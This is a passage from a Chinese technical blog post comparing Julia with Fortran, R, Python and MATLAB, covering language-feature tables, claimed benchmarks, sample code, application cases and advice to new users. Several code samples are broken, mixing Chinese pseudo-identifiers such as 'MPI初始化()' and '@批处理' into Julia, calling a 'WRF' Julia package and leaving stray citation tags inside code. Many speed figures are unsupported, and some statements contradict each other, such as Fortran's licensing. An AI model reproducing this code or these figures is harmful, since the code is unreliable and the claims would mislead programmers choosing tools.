class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>特性</th>\n<th>Julia</th>\n<th>Fortran</th>\n</tr><tr>\n<td>语言类型</td>\n<td>动态类型，JIT编译</td>\n<td>静态类型，编译执行</td>\n</tr>\n<tr>\n<td>性能</td>\n<td>接近Fortran，某些场景更优</td>\n<td>静态类型，性能最佳</td>\n</tr>\n<tr>\n<td>语法</td>\n<td>类似Python，支持Unicode字符</td>\n<td>语法古老，开发效率低</td>\n</tr>\n<tr>\n<td>并行计算</td>\n<td>原生支持，简单易用</td>\n<td>需手动实现并行，复杂</td>\n</tr>\n<tr>\n<td>GPU支持</td>\n<td>原生支持（CUDA.jl）</td>\n<td>需手动调用CUDA API</td>\n</tr>\n<tr>\n<td>部署</td>\n<td>支持单文件编译</td>\n<td>需编译为可执行文件</td>\n</tr>\n<tr>\n<td>开源</td>\n<td>开源MIT许可证</td>\n<td>部分库闭源，许可证成本高</td>\n</tr>\n</tbody>\n</table>\n</section><h4><span class=\"prefix\"></span><span class=\"content\">2. 科学计算对比</span><span class=\"suffix\"></span></h4>\n<p>在科学计算领域，Julia与Fortran各有优势：</p>\n<ul>\n<li><section><strong>Fortran</strong>：在特定算法（如BLAS）上仍有优势，但开发效率低</section></li><li><section><strong>Julia</strong>：性能接近Fortran，开发效率高，生态整合好</section></li></ul>\n<p><strong>实测数据</strong>：</p>\n<ul>\n<li><section><strong>BLAS调用</strong>：Julia的Octavian.jl在Intel CPU上性能与OpenBLAS相当</section></li><li><section><strong>微分方程求解</strong>：Julia的DifferentialEquations.jl在特定算法上比Fortran快1.7倍</section></li><li><section><strong>代码简洁性</strong>：Julia比Fortran代码简洁76%</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">3. 高性能计算对比</span><span class=\"suffix\"></span></h4>\n<p>在高性能计算（HPC）领域，Julia与Fortran的对比如下：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-comment\">#&nbsp;Julia&nbsp;HPC示例</span><br /><span class=\"hljs-keyword\">using</span>&nbsp;Distributed,MPI<br />MPI初始化()<br />add&nbsp;procs(<span class=\"hljs-number\">100</span>)&nbsp;<span class=\"hljs-comment\">#&nbsp;添加100个进程</span><br /><span class=\"hljs-comment\">#&nbsp;分布式计算</span><br /><span class=\"hljs-meta\">@批处理</span>&nbsp;<span class=\"hljs-number\">1</span>:N&nbsp;sqrt&nbsp;<span class=\"hljs-comment\">#&nbsp;在N个进程中并行计算</span><br /><span class=\"hljs-comment\">#&nbsp;MPI并行</span><br />sendbuff&nbsp;=&nbsp;[<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>]<br />MPI.发送(sendbuff,&nbsp;<span class=\"hljs-number\">1</span>,&nbsp;<span class=\"hljs-number\">0</span>)<br /></code></pre>\n<p><strong>性能对比</strong>：</p>\n<ul>\n<li><section><strong>集群扩展性</strong>：Julia在100节点集群上扩展性好，线性加速比&gt;90%</section></li><li><section><strong>GPU加速</strong>：Julia的CUDA.jl比Fortran的CUDA调用简单且性能接近</section></li></ul>\n<h3><span class=\"prefix\"></span><span class=\"content\">十三、Julia与R的对比分析</span><span class=\"suffix\"></span></h3>\n<h4><span class=\"prefix\"></span><span class=\"content\">1. 语言特性对比</span><span class=\"suffix\"></span></h4>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>特性</th>\n<th>Julia</th>\n<th>R</th>\n</tr><tr>\n<td>语言类型</td>\n<td>动态类型，JIT编译</td>\n<td>动态类型，解释执行</td>\n</tr>\n<tr>\n<td>性能</td>\n<td>接近C/Fortran，循环计算比R快100倍</td>\n<td>性能极差，依赖C扩展</td>\n</tr>\n<tr>\n<td>语法</td>\n<td>类似Python，支持Unicode字符</td>\n<td>语法晦涩，S3/S4类系统复杂</td>\n</tr>\n<tr>\n<td>类型系统</td>\n<td>动态类型但有类型推断，性能高</td>\n<td>S3/S4类系统复杂，性能差</td>\n</tr>\n<tr>\n<td>并行计算</td>\n<td>原生支持，简单易用</td>\n<td>需额外包（如parallel），性能差</td>\n</tr>\n<tr>\n<td>部署</td>\n<td>支持单文件编译</td>\n<td>部署复杂，依赖R环境</td>\n</tr>\n<tr>\n<td>开源</td>\n<td>开源MIT许可证</td>\n<td>开源，但生态碎片化</td>\n</tr>\n</tbody>\n</table>\n</section><h4><span class=\"prefix\"></span><span class=\"content\">2. 统计计算对比</span><span class=\"suffix\"></span></h4>\n<p>R是统计计算的黄金标准，但Julia在性能和开发效率上有显著优势：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-comment\">#&nbsp;Julia统计计算示例</span><br /><span class=\"hljs-keyword\">using</span>&nbsp;Distributions,&nbsp;HypothesisTests<br /><span class=\"hljs-comment\">#&nbsp;定义分布</span><br />dist&nbsp;=&nbsp;Normal(<span class=\"hljs-number\">0</span>,&nbsp;<span class=\"hljs-number\">1</span>)<br /><span class=\"hljs-comment\">#&nbsp;采样</span><br />x&nbsp;=&nbsp;rand(dist,&nbsp;<span class=\"hljs-number\">1000</span>)<br /><span class=\"hljs-comment\">#&nbsp;统计检验</span><br />ttest(x,&nbsp;y)<br /><span class=\"hljs-comment\">#&nbsp;线性回归</span><br /><span class=\"hljs-keyword\">using</span>&nbsp;GLM<br />ols&nbsp;=&nbsp;fit(LinearModel,&nbsp;<span class=\"hljs-meta\">@formula</span>(Y&nbsp;~&nbsp;X),&nbsp;df)<br /></code></pre>\n<p><strong>性能对比</strong>：</p>\n<ul>\n<li><section><strong>线性回归</strong>：Julia比R快10-20倍</section></li><li><section><strong>矩阵运算</strong>：Julia比R快5-10倍</section></li><li><section><strong>循环计算</strong>：Julia比R快100倍</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">3. 数据科学对比</span><span class=\"suffix\"></span></h4>\n<p>在数据科学领域，Julia的DataFrames.jl比R的dplyr有显著优势：</p>\n<ul>\n<li><section><strong>内存效率</strong>：DataFrames.jl比dplyr更高效</section></li><li><section><strong>性能</strong>：DataFrames.jl比dplyr快10倍</section></li><li><section><strong>API设计</strong>：DataFrames.jl比dplyr更简洁</section></li></ul>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>维度</th>\n<th>Julia</th>\n<th>Python</th>\n<th>MATLAB</th>\n<th>R</th>\n<th>Fortran</th>\n</tr><tr>\n<td><strong>性能</strong></td>\n<td>⭐⭐⭐⭐⭐（接近 C）</td>\n<td>⭐⭐（需 NumPy/Cython 加速）</td>\n<td>⭐⭐⭐（JIT 有限）</td>\n<td>⭐（向量化快，循环慢）</td>\n<td>⭐⭐⭐⭐⭐（HPC 黄金标准）</td>\n</tr>\n<tr>\n<td><strong>语法易用性</strong></td>\n<td>⭐⭐⭐⭐（数学友好）</td>\n<td>⭐⭐⭐⭐⭐</td>\n<td>⭐⭐⭐⭐</td>\n<td>⭐⭐⭐</td>\n<td>⭐（冗长，现代 Fortran 改善）</td>\n</tr>\n<tr>\n<td><strong>数值计算</strong></td>\n<td>⭐⭐⭐⭐⭐（原生支持）</td>\n<td>⭐⭐⭐⭐（NumPy/SciPy）</td>\n<td>⭐⭐⭐⭐⭐（矩阵为中心）</td>\n<td>⭐⭐⭐（stats 为主）</td>\n<td>⭐⭐⭐⭐⭐（数组操作强）</td>\n</tr>\n<tr>\n<td><strong>可视化</strong></td>\n<td>⭐⭐⭐⭐（Makie/Plots）</td>\n<td>⭐⭐⭐⭐⭐（Matplotlib/Seaborn/Plotly）</td>\n<td>⭐⭐⭐⭐⭐（内置强大）</td>\n<td>⭐⭐⭐⭐⭐（ggplot2）</td>\n<td>⭐（依赖外部库）</td>\n</tr>\n<tr>\n<td><strong>数据科学</strong></td>\n<td>⭐⭐⭐⭐（DataFrames.jl 成熟）</td>\n<td>⭐⭐⭐⭐⭐（pandas 主导）</td>\n<td>⭐⭐⭐（Table 支持一般）</td>\n<td>⭐⭐⭐⭐⭐（tidyverse）</td>\n<td>⭐</td>\n</tr>\n<tr>\n<td><strong>机器学习</strong></td>\n<td>⭐⭐⭐（MLJ/Flux 发展中）</td>\n<td>⭐⭐⭐⭐⭐（scikit-learn/TensorFlow/PyTorch）</td>\n<td>⭐⭐⭐（Statistics and ML Toolbox）</td>\n<td>⭐⭐⭐（caret/tidymodels）</td>\n<td>⭐</td>\n</tr>\n<tr>\n<td><strong>深度学习</strong></td>\n<td>⭐⭐⭐（Flux/Lux 快速发展）</td>\n<td>⭐⭐⭐⭐⭐（PyTorch/TensorFlow）</td>\n<td>⭐⭐（Deep Learning Toolbox）</td>\n<td>⭐</td>\n<td>⭐</td>\n</tr>\n<tr>\n<td><strong>微分方程/科学计算</strong></td>\n<td>⭐⭐⭐⭐⭐（DifferentialEquations.jl）</td>\n<td>⭐⭐⭐（SciPy）</td>\n<td>⭐⭐⭐⭐</td>\n<td>⭐⭐</td>\n<td>⭐⭐⭐⭐（如 PETSc 接口）</td>\n</tr>\n<tr>\n<td><strong>并行/GPU</strong></td>\n<td>⭐⭐⭐⭐⭐（原生多级并行）</td>\n<td>⭐⭐⭐（multiprocessing, CuPy）</td>\n<td>⭐⭐⭐（Parallel Computing Toolbox）</td>\n<td>⭐⭐（future/parallel）</td>\n<td>⭐⭐⭐⭐（OpenMP/MPI）</td>\n</tr>\n<tr>\n<td><strong>社区与生态</strong></td>\n<td>⭐⭐⭐（快速增长）</td>\n<td>⭐⭐⭐⭐⭐</td>\n<td>⭐⭐⭐（商业闭源限制）</td>\n<td>⭐⭐⭐⭐</td>\n<td>⭐⭐（学术/HPC 圈）</td>\n</tr>\n<tr>\n<td><strong>开源免费</strong></td>\n<td>✅（MIT）</td>\n<td>✅</td>\n<td>❌（商业许可）</td>\n<td>✅</td>\n<td>✅（现代编译器如 gfortran）</td>\n</tr>\n</tbody>\n</table>\n</section><h3><span class=\"prefix\"></span><span class=\"content\">十四、实际应用案例</span><span class=\"suffix\"></span></h3>\n<h4><span class=\"prefix\"></span><span class=\"content\">1. 气象模拟应用</span><span class=\"suffix\"></span></h4>\n<p>Julia正在气象模拟领域取得突破，如WRF模型的Julia实现：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-comment\">#&nbsp;Julia气象模拟示例</span><br /><span class=\"hljs-keyword\">using</span>&nbsp;WRF<br /><span class=\"hljs-comment\">#&nbsp;设置模拟参数</span><br />params&nbsp;=&nbsp;WRFParams(<br />&nbsp;&nbsp;&nbsp;&nbsp;nx&nbsp;=&nbsp;<span class=\"hljs-number\">200</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;ny&nbsp;=&nbsp;<span class=\"hljs-number\">200</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;nz&nbsp;=&nbsp;<span class=\"hljs-number\">50</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;dt&nbsp;=&nbsp;<span class=\"hljs-number\">30</span>,<br />&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"hljs-comment\">#&nbsp;其他参数...</span><br />)<br /><br /><span class=\"hljs-comment\">#&nbsp;初始化模型</span><br />model&nbsp;=&nbsp;WRFModel(params)<br /><br /><span class=\"hljs-comment\">#&nbsp;运行模拟</span><br />solve(model,&nbsp;tspan=(<span class=\"hljs-number\">0</span>,&nbsp;<span class=\"hljs-number\">24</span>*<span class=\"hljs-number\">3600</span>))<br /><br /><span class=\"hljs-comment\">#&nbsp;可视化结果</span><br /><span class=\"hljs-keyword\">using</span>&nbsp;GLMakie<br />contourf(model压力场,&nbsp;title=<span class=\"hljs-string\">\"海平面气压场\"</span>)<br /></code></pre>\n<p><strong>性能对比</strong>：</p>\n<ul>\n<li><section><strong>1000万网格点模拟</strong>：Julia比传统Fortran实现快2-3倍</section></li><li><section><strong>代码简洁性</strong>：Julia代码比Fortran少50-70%</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">2. 机器学习应用</span><span class=\"suffix\"></span></h4>\n<p>Julia的Flux.jl和MLJ.jl在机器学习领域有广泛应用：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-comment\">#&nbsp;Julia机器学习示例</span><br /><span class=\"hljs-keyword\">using</span>&nbsp;Flux<br /><span class=\"hljs-comment\">#&nbsp;定义深度学习模型</span><br />model&nbsp;=&nbsp;Chain(<br />&nbsp;&nbsp;&nbsp;&nbsp;Dense(<span class=\"hljs-number\">784</span>,&nbsp;<span class=\"hljs-number\">32</span>,&nbsp;relu),<br />&nbsp;&nbsp;&nbsp;&nbsp;Dense(<span class=\"hljs-number\">32</span>,&nbsp;<span class=\"hljs-number\">10</span>),<br />&nbsp;&nbsp;&nbsp;&nbsp;softmax<br />)<br /><br /><span class=\"hljs-comment\">#&nbsp;训练模型</span><br />loss(x,&nbsp;y)&nbsp;=&nbsp;crossentropy(model(x),&nbsp;y)<br />ps&nbsp;=&nbsp;params(model)<br /><span class=\"hljs-meta\">@epochs</span>&nbsp;<span class=\"hljs-number\">100</span>&nbsp;train!(loss,&nbsp;ps,&nbsp;data,&nbsp;ADAM())[(deep_research_source_group_web_54)]<br /><br /><span class=\"hljs-comment\">#&nbsp;使用MLJ.jl进行机器学习</span><br /><span class=\"hljs-keyword\">using</span>&nbsp;MLJ<br /><span class=\"hljs-comment\">#&nbsp;加载模型</span><br />model&nbsp;=&nbsp;<span class=\"hljs-meta\">@load</span>&nbsp;RandomForestClassifier<br /><span class=\"hljs-comment\">#&nbsp;创建管道</span><br />pipeline&nbsp;=&nbsp;<span class=\"hljs-meta\">@pipeline</span>(<br />&nbsp;&nbsp;&nbsp;&nbsp;Standardizer(),<br />&nbsp;&nbsp;&nbsp;&nbsp;model,<br />&nbsp;&nbsp;&nbsp;&nbsp;Imputer()<br />)<br /><span class=\"hljs-comment\">#&nbsp;训练和评估</span><br />evaluate(pipeline,&nbsp;X,&nbsp;y,&nbsp;measure=r²)[(deep_research_source_group_web_55)]<br /></code></pre>\n<p><strong>性能对比</strong>：</p>\n<ul>\n<li><section><strong>ResNet50训练</strong>：Julia比Python快12%</section></li><li><section><strong>随机森林训练</strong>：Julia比Python快2.5倍</section></li><li><section><strong>代码简洁性</strong>：Julia代码比Python简洁30-50%</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">3. 科学计算应用</span><span class=\"suffix\"></span></h4>\n<p>DifferentialEquations.jl在微分方程求解领域有广泛应用：</p>\n<pre class=\"custom\"><code class=\"hljs\"><span class=\"hljs-comment\">#&nbsp;Julia微分方程求解示例</span><br /><span class=\"hljs-keyword\">using</span>&nbsp;DifferentialEquations,&nbsp;Plots<br /><span class=\"hljs-comment\">#&nbsp;定义Lorenz系统</span><br /><span class=\"hljs-keyword\">function</span>&nbsp;lorenz(du,&nbsp;u,&nbsp;p,&nbsp;t)<br />&nbsp;&nbsp;&nbsp;&nbsp;σ,&nbsp;ρ,&nbsp;β&nbsp;=&nbsp;p<br />&nbsp;&nbsp;&nbsp;&nbsp;du[<span class=\"hljs-number\">1</span>]&nbsp;=&nbsp;σ*(u[<span class=\"hljs-number\">2</span>]&nbsp;-&nbsp;u[<span class=\"hljs-number\">1</span>])<br />&nbsp;&nbsp;&nbsp;&nbsp;du[<span class=\"hljs-number\">2</span>]&nbsp;=&nbsp;u[<span class=\"hljs-number\">1</span>]*(ρ&nbsp;-&nbsp;u[<span class=\"hljs-number\">3</span>])&nbsp;-&nbsp;u[<span class=\"hljs-number\">2</span>]<br />&nbsp;&nbsp;&nbsp;&nbsp;du[<span class=\"hljs-number\">3</span>]&nbsp;=&nbsp;u[<span class=\"hljs-number\">1</span>]*u[<span class=\"hljs-number\">2</span>]&nbsp;-&nbsp;β*u[<span class=\"hljs-number\">3</span>]<br /><span class=\"hljs-keyword\">end</span><br /><br /><span class=\"hljs-comment\">#&nbsp;定义问题</span><br />p&nbsp;=&nbsp;[<span class=\"hljs-number\">10.0</span>,&nbsp;<span class=\"hljs-number\">28.0</span>,&nbsp;<span class=\"hljs-number\">8</span>/<span class=\"hljs-number\">3</span>]<br />u0&nbsp;=&nbsp;[<span class=\"hljs-number\">1.0</span>,&nbsp;<span class=\"hljs-number\">0.0</span>,&nbsp;<span class=\"hljs-number\">0.0</span>]<br />tspan =&nbsp;(<span class=\"hljs-number\">0.0</span>,&nbsp;<span class=\"hljs-number\">100.0</span>)<br />prob&nbsp;=&nbsp;ODEProblem(lorenz,&nbsp;u0,&nbsp;tspan,&nbsp;p)<br /><br /><span class=\"hljs-comment\">#&nbsp;求解问题</span><br />sol&nbsp;=&nbsp;solve(prob,&nbsp;Tsit5(),&nbsp;reltol=<span class=\"hljs-number\">1e-8</span>,&nbsp;abstol=<span class=\"hljs-number\">1e-8</span>)<br /><br /><span class=\"hljs-comment\">#&nbsp;可视化结果</span><br />plot(sol,&nbsp;vars=(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>),&nbsp;title=<span class=\"hljs-string\">\"Lorenz系统相图\"</span>,&nbsp;label=<span class=\"hljs-literal\">false</span>)<br />plot!(sol,&nbsp;vars=(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">3</span>),&nbsp;title=<span class=\"hljs-string\">\"Lorenz系统相图\"</span>,&nbsp;label=<span class=\"hljs-literal\">false</span>)<br /></code></pre>\n<p><strong>性能对比</strong>：</p>\n<ul>\n<li><section><strong>CPU求解</strong>：Julia性能与C++/Fortran相当</section></li><li><section><strong>GPU求解</strong>：Julia比PyTorch快20-100倍</section></li><li><section><strong>代码简洁性</strong>：Julia代码比Fortran简洁76%</section></li></ul>\n<h3><span class=\"prefix\"></span><span class=\"content\">细分领域对比总结：</span><span class=\"suffix\"></span></h3>\n<ul>\n<li><section><strong>数值模拟 &amp; HPC</strong>：Julia ≈ Fortran &gt; MATLAB &gt; Python &gt; R<br />\n（Julia 在易用性和性能间取得最佳平衡）</section></li><li><section><strong>数据探索 &amp; 统计分析</strong>：R ≈ Python &gt; Julia &gt; MATLAB &gt; Fortran</section></li><li><section><strong>深度学习研究</strong>：Python &gt;&gt; Julia &gt; MATLAB &gt; R ≈ Fortran</section></li><li><section><strong>微分方程求解</strong>：Julia &gt; MATLAB ≈ Python &gt; R &gt; Fortran（除非手写）</section></li><li><section><strong>教学与快速原型</strong>：Python ≈ MATLAB &gt; Julia &gt; R &gt; Fortran</section></li><li><section><strong>生产部署</strong>：Python &gt; Julia（正在追赶）&gt; MATLAB（许可证问题）&gt; R &gt; Fortran</section></li></ul>\n<h3><span class=\"prefix\"></span><span class=\"content\">十五、学习曲线与社区支持</span><span class=\"suffix\"></span></h3>\n<h4><span class=\"prefix\"></span><span class=\"content\">1. 学习曲线对比</span><span class=\"suffix\"></span></h4>\n<section class=\"table-container\"><table>\n<tbody>\n<tr>\n<th>语言</th>\n<th>学习难度</th>\n<th>上手时间</th>\n<th>主要学习资源</th>\n</tr><tr>\n<td>Julia</td>\n<td>中等</td>\n<td>1-2周</td>\n<td>官方文档、Julia学院、GitHub仓库</td>\n</tr>\n<tr>\n<td>MATLAB</td>\n<td>低</td>\n<td>1周</td>\n<td>官方教程、大量在线资源</td>\n</tr>\n<tr>\n<td>Python</td>\n<td>低</td>\n<td>1-2周</td>\n<td>官方文档、大量在线教程</td>\n</tr>\n<tr>\n<td>Fortran</td>\n<td>高</td>\n<td>2-3个月</td>\n<td>官方文档、专业书籍</td>\n</tr>\n<tr>\n<td>R</td>\n<td>中等</td>\n<td>2-3周</td>\n<td>官方文档、大量统计教程</td>\n</tr>\n</tbody>\n</table>\n</section><p><strong>学习曲线分析</strong>：</p>\n<ul>\n<li><section><strong>MATLAB用户</strong>：可快速上手Julia，语法相似</section></li><li><section><strong>Python用户</strong>：学习曲线平缓，语法相似</section></li><li><section><strong>R用户</strong>：可快速上手Julia，语法更简洁</section></li><li><section><strong>Fortran/C++用户</strong>：需适应动态类型和JIT编译，但性能接近</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">2. 社区与支持</span><span class=\"suffix\"></span></h4>\n<p>Julia社区正在快速增长，提供丰富的支持资源：</p>\n<ul>\n<li><section><strong>GitHub项目</strong>：超过20,000个Julia项目</section></li><li><section><strong>活跃度</strong>：社区年增长40%+</section></li><li><section><strong>中文社区</strong>：非常活跃，有大量中文资料</section></li><li><section><strong>文档资源</strong>：官方文档完善，包文档丰富</section></li><li><section><strong>论坛支持</strong>：Discourse论坛活跃，问题解决率高</section></li></ul>\n<h3><span class=\"prefix\"></span><span class=\"content\">十六、总结与展望</span><span class=\"suffix\"></span></h3>\n<h4><span class=\"prefix\"></span><span class=\"content\">1. Julia的核心优势总结</span><span class=\"suffix\"></span></h4>\n<ul>\n<li><section><strong>高性能</strong>：JIT编译，接近C/Fortran性能</section></li><li><section><strong>易用性</strong>：语法简洁，类似Python/MATLAB</section></li><li><section><strong>全栈统一</strong>：一个语言完成从数据处理到部署的全流程</section></li><li><section><strong>生态整合</strong>：包之间无缝集成，API统一</section></li><li><section><strong>开源社区</strong>：活跃社区，快速增长</section></li><li><section><strong>类型系统</strong>：动态类型但有类型推断，性能高</section></li><li><section><strong>多分派机制</strong>：代码更灵活，性能更优</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">2. 适用场景与用户群体</span><span class=\"suffix\"></span></h4>\n<p>Julia特别适合以下场景和用户群体：</p>\n<ul>\n<li><section><strong>科学计算</strong>：物理、化学、生物等领域的数值模拟</section></li><li><section><strong>数据科学</strong>：大规模数据分析、统计建模</section></li><li><section><strong>机器学习</strong>：高性能深度学习和传统机器学习</section></li><li><section><strong>可视化</strong>：交互式数据可视化、科学数据展示</section></li><li><section><strong>并行计算</strong>：高性能计算、分布式系统</section></li><li><section><strong>用户群体</strong>：科学家、工程师、数据分析师、机器学习研究者</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">3. 未来发展趋势</span><span class=\"suffix\"></span></h4>\n<p>Julia的未来发展趋势包括：</p>\n<ul>\n<li><section><strong>性能优化</strong>：继续提升JIT编译效率，缩小与C/Fortran的差距</section></li><li><section><strong>生态扩展</strong>：继续扩展包生态系统，覆盖更多领域</section></li><li><section><strong>工具链完善</strong>：完善IDE支持、调试工具等开发体验</section></li><li><section><strong>部署优化</strong>：简化模型和应用部署流程</section></li><li><section><strong>并行计算</strong>：继续提升分布式计算和GPU加速能力</section></li><li><section><strong>社区增长</strong>：吸引更多用户和开发者加入社区</section></li></ul>\n<h4><span class=\"prefix\"></span><span class=\"content\">4. 与主流语言的互补性</span><span class=\"suffix\"></span></h4>\n<p>Julia与主流语言不是完全替代关系，而是<strong>互补关系</strong>：</p>\n<ul>\n<li><section><strong>与Python对比</strong>：Julia在性能上有优势，但Python在生态成熟度上领先</section></li><li><section><strong>与MATLAB对比</strong>：Julia在性能和开源性上有优势，但MATLAB在交互式环境上更成熟</section></li><li><section><strong>与Fortran对比</strong>：Julia在开发效率和生态整合上有优势，但Fortran在特定科学计算领域仍有性能优势</section></li><li><section><strong>与R对比</strong>：Julia在性能和代码简洁性上有优势，但R在统计分析领域有更丰富的工具</section></li></ul>\n<h3><span class=\"prefix\"></span><span class=\"content\">十七、给潜在用户的建议</span><span class=\"suffix\"></span></h3>\n<p>对于考虑使用Julia的用户，建议如下：</p>\n<ol>\n<li><section><strong>评估需求</strong>：确定您的主要计算需求是科学计算、数据科学还是机器学习</section></li><li><section><strong>学习路径</strong>：从基础语法开始，逐步学习类型系统和多分派机制</section></li><li><section><strong>工具选择</strong>：根据应用领域选择合适的工具包（如科学计算选DifferentialEquations.jl）</section></li><li><section><strong>性能调优</strong>：学习类型稳定性、避免类型不稳定性、使用@inbounds和@ threads等优化宏</section></li><li><section><strong>社区参与</strong>：加入Julia社区，参与讨论和贡献，获取最新支持</section></li><li><section><strong>混合编程</strong>：对于已有Python/R代码，可使用PyCall/RCall调用</section></li><li><section><strong>部署策略</strong>：对于生产环境，考虑使用PackageCompiler.jl编译为单文件</section></li></ol>\n<p><strong>最佳实践</strong>：</p>\n<ul>\n<li><section><strong>代码优化</strong>：保持类型稳定性，使用@ code _ warntype检查</section></li><li><section><strong>并行策略</strong>：对于大规模数据，优先使用多线程；对于集群计算，使用分布式计算</section></li><li><section><strong>GPU加速</strong>：对于大规模科学计算，考虑使用CUDA.jl加速</section></li><li><section><strong>可视化选择</strong>：对于基础可视化，使用Plots.jl；对于高性能3D可视化，使用GLMakie</section></li></ul>\n<p>Julia作为一门新兴的科学计算语言，以其独特的设计哲学——**\"一次编写，高效运行\"**，成功融合了动态语言的易用性和静态语言的高性能。</p>\n<p>Julia 是一门为“下一代科学计算”而生的语言，其核心优势在于：</p>\n<ul>\n<li><section><strong>性能与表达力的统一</strong></section></li><li><section><strong>统一的生态系统</strong>（从微分方程到深度学习）</section></li><li><section><strong>前沿的自动微分与可微分编程支持</strong></section></li><li><section><strong>原生并行与 GPU 支持</strong></section></li></ul>\n<p>在数值系统、类型系统、可视化、数据科学、机器学习、科学计算和并行计算等核心领域，Julia都展现出显著的技术优势。</p>\n<blockquote class=\"custom-blockquote multiquote-1\">\n<p>Julia与MATLAB、Python、Fortran和R等主流语言相比仍有差距，特别是在生态成熟度和用户基数方面，但其快速发展的社区和日益完善的工具链正迅速缩小这些差距。</p>\n</blockquote>\n<p>虽然在某些领域（如深度学习框架成熟度、数据科学社区规模）仍落后于 Python，但 Julia 正在快速填补这些空白，尤其在需要<strong>高性能、可组合、可微分</strong>的科学计算场景中，已成为不可忽视的选择。</p>\n<blockquote class=\"custom-blockquote multiquote-1\">\n<p>对于新项目，尤其是涉及<strong>数值模拟、优化、微分方程、可微分建模</strong>的研究或工程任务，且追求高性能、易用性和全栈统一的科研人员和工程师来说，<strong>Julia是一个极具潜力的选择</strong>。</p>\n</blockquote>\n<p>随着Julia生态系统的不断完善和性能的持续优化，它有望在未来几年内成为科学计算领域的主流语言之一，为科研和工程计算带来新的可能性。</p>\n<hr />\n<p>公众号<a href=\"https://www.cardopt.cn/api/images/1_1763724698_ce344a.png\" rel=\"noopener nofollow\">《博優旮旯-BOYOGALA》</a>，致力于让大家<strong>更专业、更完整和更系统</strong>地获取与了解数学（<code>运筹与优化、数值分析</code>）等相关数学知识分享！</p>\n<blockquote class=\"custom-blockquote multiquote-1\">\n<p>🎯公众号ID:boyogala,\n🌐网址: www.boyogala.us.kg,\n💬微信:&nbsp;boyougala,\n📧邮箱: boyogala@qq.com.</p>\n</blockquote>\n<p>说明文档：<a href=\"https://mp.weixin.qq.com/s/OJpmAIeQnAcxmSrIXsWrWQ\" rel=\"noopener nofollow\"><strong>公众号《博優旮旯-boyogala》的使用指南</strong></a>，以下罗列代表作可供查阅.</p>\n<p><code>优化求解器</code> — <strong>代表作</strong>：\n<a href=\"https://mp.weixin.qq.com/s/UBRt0_-A0_5n85Vj6bwlGw\" rel=\"noopener nofollow\">优化求解器类型总结线性二次和非线性求解器</a>,<a href=\"https://mp.weixin.qq.com/s/MNzKEo_q06xWiH1xBCxQtQ\" rel=\"noopener nofollow\">Ipopt开源免费的非线性求解器</a>,<a href=\"https://mp.weixin.qq.com/s/pFwaMIGk86MnsG8w6Vjm2Q\" rel=\"noopener nofollow\">HiGHS开源免费整数线性求解器</a>,<a href=\"https://mp.weixin.qq.com/s/_AZ5-bdwZ1Blu3vpA98ccQ\" rel=\"noopener nofollow\">SCIP开源免费的优化求解器</a>,<a href=\"https://mp.weixin.qq.com/s/9FnUAHav-mfeYzfWZLwyGw\" rel=\"noopener nofollow\">Gurobi商业收费全局优化求解器</a>,<a href=\"https://mp.weixin.qq.com/s/LO5WH5be975ryjUczeAgTw\" rel=\"noopener nofollow\">CPLEX商业收费整数优化求解器</a>,<a href=\"https://mp.weixin.qq.com/s/xXxGCJlTaek6AymvQHf99A\" rel=\"noopener nofollow\">MOSEK商业收费的优化求解器</a>,<a href=\"https://mp.weixin.qq.com/s/g9Nu5ZzLZwGrIW6zgck1dw\" rel=\"noopener nofollow\">BARON商业收费的全局优化求解器</a>,<a href=\"https://mp.weixin.qq.com/s/BI92_k-JoCH-Eoj3lh5IsA\" rel=\"noopener nofollow\">LindoAPI商业收费的全局优化求解器</a>,<a href=\"https://mp.weixin.qq.com/s/58fIjguklH2R7v0o0aBkpA\" rel=\"noopener nofollow\">COPT国产自研的优化求解器</a></p>\n<p><code>三大数学软件</code> — <strong>代表作</strong>：\n<a href=\"https://mp.weixin.qq.com/s/N9KDUwkf8xhGD-Kt0-SzSA\" rel=\"noopener nofollow\">MATLAB工程师的科学计算软件</a>,<a href=\"https://mp.weixin.qq.com/s/aV696xDAF1Fa-YYahWWLXw\" rel=\"noopener nofollow\">MATHEMATICA物理的计算软件</a>,<a href=\"https://mp.weixin.qq.com/s/KbyK_6iHSY9stpWBLFywCQ\" rel=\"noopener nofollow\">MAPLE数学家的数学软件</a></p>\n<p><code>嵌入式、无人机和机器人</code> — <strong>代表作</strong>：\n<a href=\"https://mp.weixin.qq.com/s/_i7dolzdYlYeHoEBI7FZyw\" rel=\"noopener nofollow\">OSQP二次规划求解器</a></p>\n<p><code>线性方程组的求解软件</code> — <strong>代表作</strong>：\n<a href=\"https://mp.weixin.qq.com/s/Tcv6H4PbEqws7ivrETctFQ\" rel=\"noopener nofollow\">PARDISO并行直接求解器</a>,<a href=\"https://mp.weixin.qq.com/s/SrJXaN5whCBAYlbTHIxdIA\" rel=\"noopener nofollow\">MUMPS高性能并行求解器</a>,<a href=\"https://mp.weixin.qq.com/s/-8e69XW-2m4oNe9TBmhYnQ\" rel=\"noopener nofollow\">SuitSparse稀疏矩阵软件包</a>,<a href=\"https://mp.weixin.qq.com/s/kG6784iGW9bCn_yygx86OA\" rel=\"noopener nofollow\">SuperLU非对称直接法求解器</a></p>\n<p><code>基于MATLAB的优化建模工具</code> — <strong>代表作</strong>：\n<a 